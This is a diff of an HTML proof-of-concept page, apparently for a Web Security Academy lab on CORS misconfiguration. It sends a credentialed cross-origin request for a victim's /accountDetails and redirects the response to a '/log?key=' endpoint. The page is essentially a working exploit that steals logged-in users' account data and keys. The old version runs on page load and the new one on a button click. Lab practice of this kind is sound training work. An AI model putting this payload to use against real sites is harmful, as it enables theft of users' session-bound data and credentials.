@@ -6,19 +6,54 @@
 </head>
 <body>
   <h1>测试跨域漏洞（GET）</h1>
-  <button id="test">测试请求</button>
+  
+  <div>
+    <p>目标URL: <code id="target-url">https://0aa60052032095b18262d42f00e10067.web-security-academy.net/accountDetails</code></p>
+  </div>
+  
+  <button id="test">发起请求</button>
+  <div id="status" style="margin-top: 10px;"></div>
+  
+  <h3>响应结果：</h3>
   <pre id="result"></pre>
 
   <script>
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('get','https://0aa60052032095b18262d42f00e10067.web-security-academy.net/accountDetails',true);
-    req.withCredentials = true;
-    req.send();
-
-    function reqListener() {
-        location='/log?key='+this.responseText;
-    };
-</script>
+    document.getElementById('test').addEventListener('click', function() {
+      var statusDiv = document.getElementById('status');
+      var resultDiv = document.getElementById('result');
+      
+      // 清空之前的结果
+      statusDiv.innerHTML = '';
+      resultDiv.innerHTML = '';
+      
+      // 显示请求状态
+      statusDiv.innerHTML = '<span style="color: blue;">正在发送请求...</span>';
+      
+      var req = new XMLHttpRequest();
+      
+      req.onload = function() {
+        statusDiv.innerHTML = '<span style="color: green;">请求成功！响应已发送到日志服务器</span>';
+        resultDiv.textContent = this.responseText;
+        
+        // 发送到日志服务器
+        location='/log?key='+encodeURIComponent(this.responseText);
+      };
+      
+      req.onerror = function() {
+        statusDiv.innerHTML = '<span style="color: red;">请求失败！检查控制台获取详细信息</span>';
+        resultDiv.textContent = '请求发生错误';
+      };
+      
+      req.ontimeout = function() {
+        statusDiv.innerHTML = '<span style="color: orange;">请求超时！</span>';
+        resultDiv.textContent = '请求超时';
+      };
+      
+      req.open('get','https://0aa60052032095b18262d42f00e10067.web-security-academy.net/accountDetails',true);
+      req.withCredentials = true;
+      req.timeout = 10000; // 10秒超时
+      req.send();
+    });
+  </script>
 </body>
 </html>
